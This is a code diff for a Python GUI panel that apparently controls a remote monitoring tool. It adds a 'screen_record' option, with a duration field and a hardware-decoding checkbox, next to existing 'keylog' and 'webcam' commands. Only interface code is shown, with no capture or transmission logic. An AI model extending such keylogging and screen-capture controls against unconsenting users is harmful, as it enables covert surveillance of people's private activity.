@@ -42,7 +42,8 @@ class CheckboxFrame(ctk.CTkFrame):
                          'webcam',
                          'keylog',
                          'list_apps',
-                         'list_processes',]
+                         'list_processes',
+                         'screen_record']
         self.checkboxes = []
 
         for i in range(len(self.commands)):
@@ -56,6 +57,7 @@ class CheckboxFrame(ctk.CTkFrame):
 
         self.placeholder_text = 'Enter PID'
         self.placeholder_text2 = 'Enter duration'
+        self.placeholder_text3 = 'Enter duration'
         self.entry = ctk.CTkEntry(
             self,
             fg_color=(light_cp['bg'], dark_cp['bg']),
@@ -68,23 +70,42 @@ class CheckboxFrame(ctk.CTkFrame):
             bg_color=(light_cp['fg'], dark_cp['fg']),
             border_color=(light_cp['fg'], dark_cp['fg']),
             corner_radius=12)
+        self.entry3 = ctk.CTkEntry(
+            self,
+            fg_color=(light_cp['bg'], dark_cp['bg']),
+            bg_color=(light_cp['fg'], dark_cp['fg']),
+            border_color=(light_cp['fg'], dark_cp['fg']),
+            corner_radius=12)
         self.entry.insert(0, self.placeholder_text)
         self.entry2.insert(0, self.placeholder_text2)
+        self.entry3.insert(0, self.placeholder_text3)
 
         self.entry.bind('<FocusIn>', lambda event: self.on_entry_focus_in(
             event, self.entry, self.placeholder_text))
         self.entry2.bind('<FocusIn>', lambda event: self.on_entry_focus_in(
             event, self.entry2, self.placeholder_text2))
+        self.entry3.bind('<FocusIn>', lambda event: self.on_entry_focus_in(
+            event, self.entry3, self.placeholder_text3))
 
         self.entry.bind('<FocusOut>', lambda event: self.on_entry_focus_out(
             event, self.entry, self.placeholder_text))
         self.entry2.bind('<FocusOut>', lambda event: self.on_entry_focus_out(
             event, self.entry2, self.placeholder_text2))
+        self.entry3.bind('<FocusOut>', lambda event: self.on_entry_focus_out(
+            event, self.entry3, self.placeholder_text3))
 
         self.entry.grid(row=2, column=2, padx=20, pady=10)
         self.entry.grid_columnconfigure(1, weight=1)
         self.entry2.grid(row=5, column=2, padx=20, pady=10)
         self.entry2.grid_columnconfigure(1, weight=1)
+        self.entry3.grid(row=8, column=2, padx=20, pady=10)
+        self.entry3.grid_columnconfigure(1, weight=1)
+        self.checkbox = ctk.CTkCheckBox(master=self,
+                                text="Hardware decoding",
+                                corner_radius=12
+                                );
+        self.checkbox.grid(
+                row=9, column=2, padx=20, pady=10, sticky='w')
 
     def on_entry_focus_in(self, event, entry, placeholder_text):
         if entry.get() == placeholder_text:
@@ -118,6 +139,10 @@ class CheckboxFrame(ctk.CTkFrame):
                         text) else '0'
                     options.append(self.checkboxes[i].cget(
                         'text') + ' ' + text)
+                elif self.commands[i] == 'screen_record':
+                    text = self.entry3.get()
+                    options.append(self.checkboxes[i].cget(
+                        'text') + ' ' + text + ' ' + str(self.checkbox.get()))
                 else:
                     options.append(self.checkboxes[i].cget('text'))
         checked_options = '\n'.join(options)
